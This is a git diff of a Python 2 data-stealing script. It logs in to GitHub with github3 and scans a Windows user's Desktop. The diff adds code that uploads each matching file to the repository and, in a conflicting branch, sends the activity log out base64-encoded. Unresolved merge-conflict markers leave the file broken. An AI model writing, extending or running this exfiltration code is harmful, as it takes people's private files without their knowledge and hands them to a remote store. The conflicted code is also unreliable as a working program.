@@ -3,14 +3,10 @@ import os.path as path
 from github3 import login
 import base64
 import random
-##import get_screenshot
 
-
-
-##get_screenshot.get_screenshot()
 def connect_to_github():  
-    gh=login(username="<username>",password="<password>")  
-    repo=gh.repository("<username>","<repository>")  
+    gh=login(username="user",password="<password>")  
+    repo=gh.repository("user","test")  
     branch=repo.branch("master")  
     return gh,repo,branch
   
@@ -45,17 +41,25 @@ def searchdesktop(log_name):
                         print "Send this file! "
                         f.write("Send this file! \n")
                         full_file_name = 'C:\\Users'+os.sep+user+os.sep+'Desktop'+os.sep+filename
-                        with open(full_file_name,'rb') as f_temp:
-                            if not path.exists('temp'):
-                                os.mkdir('temp')
-                            with open('temp'+os.sep+str(random.randint(100,999))+filename,'wb') as f_save_file:
-                                f_save_file.write(f_temp.read())
-                                #store_data(f_temp,remote_path)
+                        try:
+                            with open(full_file_name,'rb') as f_temp:
+##                                if not path.exists('temp'):
+##                                    os.mkdir('temp')
+##                                with open('temp'+os.sep+str(random.randint(100,999))+filename,'wb') as f_save_file:
+##                                    f_save_file.write(f_temp.read())
+                                store_data(f_temp.read(),'file/'+filename)
+                        except:
+                            f.write('This file is being used. ')
                 
             f.write('End\n')
     f.close()
+<<<<<<< HEAD
 ##    with open(log_name,'r') as senddate:
 ##        store_data_b64(senddate.read(),remote_path)
+=======
+    with open(log_name,'r') as senddate:
+        store_data_b64(senddate.read(),'log/log.txt')
+>>>>>>> c03325a333a2704df25bcbc3498d40af0f8508ab
 
 if __name__ == '__main__':
     searchdesktop('log.txt')
